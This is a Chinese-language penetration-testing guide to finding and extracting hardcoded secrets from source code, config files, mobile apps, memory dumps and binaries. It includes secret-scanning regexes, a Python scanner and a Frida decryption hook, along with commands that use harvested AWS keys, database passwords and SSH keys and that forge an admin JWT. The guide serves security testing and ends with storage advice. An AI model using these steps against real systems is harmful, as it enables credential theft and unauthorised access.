# 密钥提取技术

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供密钥提取的系统性方法论。通过本指南，测试人员可以从源代码、配置文件、内存、二进制文件等位置发现并提取硬编码的加密密钥、API 密钥、密码等敏感信息。

### 1.2 适用范围
本文档适用于以下场景：
- 移动应用逆向工程
- 源代码审计
- 配置文件分析
- 内存取证
- 二进制文件逆向
- 容器/虚拟机镜像分析

### 1.3 读者对象
- 渗透测试工程师
- 移动安全测试人员
- 逆向工程师
- 代码审计人员
- 事件响应人员

---

## 第二部分：核心渗透技术专题

### 专题一：密钥提取

#### 2.1 技术介绍

**密钥提取**是从应用程序、配置文件、内存或其他存储介质中发现并提取加密密钥的技术。硬编码密钥是常见的安全漏洞，攻击者获取密钥后可解密敏感数据、伪造认证令牌或访问受保护的服务。

**常见密钥类型：**

| 密钥类型 | 示例 | 风险等级 |
|---------|------|---------|
| JWT 密钥 | `your-256-bit-secret` | 严重 |
| API Key | `AKIAIOSFODNN7EXAMPLE` | 高危 |
| 数据库密码 | `password123` | 高危 |
| 加密密钥 | AES-256 密钥 | 严重 |
| OAuth 密钥 | Client Secret | 高危 |
| SSH 私钥 | id_rsa | 严重 |
| 证书私钥 | .pfx, .p12 | 严重 |

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 移动应用 | App 登录、API 调用 | 密钥硬编码在 APK/IPA 中 |
| Web 应用 | 配置文件、环境变量 | .env 文件泄露、config.js |
| 云服务 | AWS/Azure/GCP 凭证 | 凭证提交到代码仓库 |
| IoT 设备 | 设备认证、固件加密 | 固件中硬编码主密钥 |
| 桌面应用 | 软件激活、许可证验证 | 逆向工程提取密钥 |
| 微服务 | 服务间认证 | 共享密钥泄露影响所有服务 |

#### 2.3 漏洞检测方法

##### 2.3.1 源代码扫描

```bash
# 使用 grep 搜索常见密钥模式
grep -r "secret" --include="*.py" --include="*.js" --include="*.java" .
grep -r "password" --include="*.py" --include="*.js" --include="*.java" .
grep -r "api_key" --include="*.py" --include="*.js" --include="*.java" .
grep -r "AKIA" --include="*" .  # AWS Access Key

# 使用 truffleHog 检测
trufflehog git https://github.com/target/repo.git

# 使用 GitLeaks 检测
gitleaks detect --source /path/to/repo

# 使用 detect-secrets
detect-secrets scan --all-files > .secrets.baseline
```

##### 2.3.2 配置文件检测

```bash
# 检测常见配置文件中的密钥
find . -name "*.env" -o -name "*.config" -o -name "*.yml" -o -name "*.yaml" -o -name "*.json"

# 检查文件内容
cat .env
cat config.json
cat settings.py
```

##### 2.3.3 移动应用检测

```bash
# Android APK 分析
# 1. 反编译 APK
apktool app.apk -o output_dir

# 2. 搜索密钥
grep -r "secret\|password\|api_key\|token" output_dir/

# 3. 检查 strings.xml
cat output_dir/res/values/strings.xml

# 4. 检查 BuildConfig
cat output_dir/smali/*/BuildConfig.smali

# iOS IPA 分析
# 1. 解压 IPA
unzip app.ipa -d output_dir

# 2. 搜索密钥
strings Payload/app.app/app | grep -i "secret\|key\|password"

# 3. 使用 class-dump
class-dump -H Payload/app.app/app | grep -i "secret\|key"
```

##### 2.3.4 内存取证

```bash
# Linux 进程内存提取
# 1. 找到进程 PID
ps aux | grep target_app

# 2. 转储内存
gdb -p <PID> -batch -command <(echo "generate-core-file core")

# 3. 搜索密钥
strings core | grep -i "secret\|password\|key"

# Windows 进程内存提取
# 使用 ProcDump
procdump -ma <PID> dump.dmp

# 使用 Volatility
volatility -f memory.dump memdump -p <PID> -D output/
```

#### 2.4 漏洞利用方法

##### 2.4.1 AWS 凭证提取

```bash
# 搜索 AWS 凭证模式
grep -r "AKIA[0-9A-Z]{16}" .

# 提取的凭证格式
# AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
# AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# 使用凭证访问 AWS
aws s3 ls --access-key AKIAIOSFODNN7EXAMPLE --secret-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

##### 2.4.2 JWT 密钥提取

```bash
# 在源代码中搜索 JWT 相关密钥
grep -r "jwt\|JWT\|jsonwebtoken" --include="*.py" --include="*.js" .

# 常见变量名
# jwt_secret, JWT_SECRET, jwtSecret, token_secret

# 提取后伪造 JWT
python3 -c "
import jwt
payload = {'admin': True, 'user_id': 1}
token = jwt.encode(payload, 'extracted_secret', algorithm='HS256')
print(token)
"
```

##### 2.4.3 数据库凭证提取

```bash
# 搜索数据库连接字符串
grep -r "mysql://\|postgres://\|mongodb://\|redis://" .

# 常见配置文件
# database.yml, config.php, settings.json, .env

# 示例提取
# mysql://root:password123@localhost:3306/database

# 使用凭证连接数据库
mysql -h localhost -u root -ppassword123 database
```

##### 2.4.4 加密密钥提取

```python
#!/usr/bin/env python3
"""
从二进制文件中提取 AES 密钥
"""
import re

def extract_aes_keys(binary_file):
    """提取可能的 AES 密钥（16/24/32 字节）"""
    with open(binary_file, 'rb') as f:
        data = f.read()
    
    # AES-128 密钥（16 字节）
    aes128_pattern = rb'[\x00-\xff]{16}'
    
    # 在二进制数据中搜索连续的高熵数据块
    keys = []
    for i in range(0, len(data) - 16, 16):
        chunk = data[i:i+16]
        # 简单熵检测（实际应使用更复杂的检测）
        if len(set(chunk)) > 10:  # 高熵
            keys.append(chunk.hex())
    
    return keys[:10]  # 返回前 10 个候选密钥

# 使用示例
# keys = extract_aes_keys('app.bin')
# for key in keys:
#     print(f"候选密钥：{key}")
```

##### 2.4.5 SSH 私钥提取

```bash
# 搜索 SSH 私钥
grep -r "BEGIN RSA PRIVATE KEY\|BEGIN OPENSSH PRIVATE KEY" .

# 提取的私钥格式
# -----BEGIN RSA PRIVATE KEY-----
# MIIEpAIBAAKCAQEA...
# -----END RSA PRIVATE KEY-----

# 设置权限并使用
chmod 600 extracted_key
ssh -i extracted_key user@target

# 搜索 SSH 公钥认证配置
grep -r "authorized_keys\|id_rsa" .
```

##### 2.4.6 自动化密钥提取工具

```python
#!/usr/bin/env python3
"""
自动化密钥提取工具
"""
import re
import os
import sys

class KeyExtractor:
    def __init__(self, target_path):
        self.target_path = target_path
        self.patterns = {
            'AWS Access Key': r'AKIA[0-9A-Z]{16}',
            'AWS Secret Key': r'(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])',
            'GitHub Token': r'ghp_[A-Za-z0-9]{36}',
            'Google API Key': r'AIza[0-9A-Za-z_-]{35}',
            'JWT Secret': r'(?i)(jwt[_-]?secret|jwt[_-]?key)\s*[=:]\s*[\'"]?([A-Za-z0-9_\-]{8,})[\'"]?',
            'Generic Secret': r'(?i)(secret|password|passwd|pwd)\s*[=:]\s*[\'"]?([^\s\'"]{4,})[\'"]?',
            'Private Key': r'-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----',
        }
        self.results = {}
    
    def scan_file(self, filepath):
        """扫描单个文件"""
        try:
            with open(filepath, 'r', errors='ignore') as f:
                content = f.read()
        except:
            return
        
        for key_type, pattern in self.patterns.items():
            matches = re.findall(pattern, content)
            if matches:
                if key_type not in self.results:
                    self.results[key_type] = []
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[-1]  # 取最后一个分组
                    self.results[key_type].append({
                        'file': filepath,
                        'value': match[:50] + '...' if len(match) > 50 else match
                    })
    
    def scan_directory(self):
        """扫描目录"""
        for root, dirs, files in os.walk(self.target_path):
            # 跳过常见忽略目录
            dirs[:] = [d for d in dirs if d not in ['.git', 'node_modules', '__pycache__', '.venv']]
            
            for file in files:
                filepath = os.path.join(root, file)
                self.scan_file(filepath)
                print(f"\r[*] 扫描中：{filepath}", end='', flush=True)
        
        print()
    
    def report(self):
        """生成报告"""
        print("\n[+] 密钥提取报告")
        print("=" * 60)
        
        for key_type, findings in self.results.items():
            print(f"\n{key_type}:")
            for finding in findings:
                print(f"  文件：{finding['file']}")
                print(f"  值：{finding['value']}")
                print()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("用法：python key_extractor.py <target_path>")
        sys.exit(1)
    
    extractor = KeyExtractor(sys.argv[1])
    extractor.scan_directory()
    extractor.report()
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过混淆

```bash
# 当密钥被 Base64 编码时
# 方法：解码后搜索

grep -r "[A-Za-z0-9+/=]\{20,\}" . | while read line; do
    echo "$line" | awk -F: '{print $2}' | base64 -d 2>/dev/null
done

# 当密钥被 XOR 加密时
# 方法：尝试常见 XOR 密钥
python3 -c "
data = bytes.fromhex('encrypted_hex')
for key in range(256):
    decrypted = bytes([b ^ key for b in data])
    if b'secret' in decrypted.lower() or b'password' in decrypted.lower():
        print(f'Key {key}: {decrypted}')
"
```

##### 2.5.2 绕过字符串加密

```bash
# 当字符串在运行时解密时
# 方法：使用 Frida 动态插桩

# Frida 脚本示例
# hook_decrypt.js
Java.perform(function() {
    var SecretClass = Java.use('com.target.SecretClass');
    
    SecretClass.decrypt.implementation = function(input) {
        var result = this.decrypt(input);
        console.log('Decrypted: ' + result);
        return result;
    };
});

# 运行
frida -U -f com.target.app -l hook_decrypt.js
```

---

## 第三部分：附录

### 3.1 密钥提取工具清单

| 工具 | 用途 | 链接 |
|-----|------|------|
| truffleHog | Git 历史密钥扫描 | https://github.com/dxa4481/truffleHog |
| GitLeaks | Git 仓库密钥扫描 | https://github.com/zricethezav/gitleaks |
| detect-secrets | 密钥检测 | https://github.com/Yelp/detect-secrets |
| MobSF | 移动应用安全扫描 | https://github.com/MobSF/Mobile-Security-Framework-MobSF |
| jadx | Android 反编译 | https://github.com/skylot/jadx |
| Ghidra | 二进制逆向 | https://ghidra-sre.org/ |
| Volatility | 内存取证 | https://www.volatilityfoundation.org/ |

### 3.2 常见密钥模式正则表达式

```regex
# AWS Access Key
AKIA[0-9A-Z]{16}

# AWS Secret Key
[A-Za-z0-9/+=]{40}

# GitHub Personal Access Token
ghp_[A-Za-z0-9]{36}

# GitHub OAuth Access Token
gho_[A-Za-z0-9]{36}

# Google API Key
AIza[0-9A-Za-z_-]{35}

# Google OAuth Client Secret
[A-Za-z0-9_-]{24}

# Slack API Token
xox[baprs]-[0-9]{10,12}-[0-9]{10,12}-[a-zA-Z0-9]{24}

# Slack Webhook
https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}

# JWT Secret (常见变量名)
(?i)(jwt[_-]?secret|jwt[_-]?key)\s*[=:]\s*[\'"]?([A-Za-z0-9_\-]{8,})[\'"]?

# Private Key
-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----
```

### 3.3 密钥安全存储建议

**开发环境：**
- 使用环境变量存储密钥
- 使用 .env 文件（加入 .gitignore）
- 使用密钥管理服务（KMS）

**生产环境：**
- 使用云厂商 KMS（AWS KMS、Azure Key Vault、GCP KMS）
- 使用 HashiCorp Vault
- 实施密钥轮换策略
- 最小权限原则

**代码仓库：**
- 永远不要提交密钥到版本控制
- 使用 pre-commit hooks 检测密钥
- 定期扫描 Git 历史
- 如泄露立即轮换密钥

---

## 参考资源

- [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)
- [GitGuardian Secrets Detection](https://www.gitguardian.com/secrets-detection)
- [AWS Security Best Practices](https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html)
- [12 Factor App - Config](https://12factor.net/config)
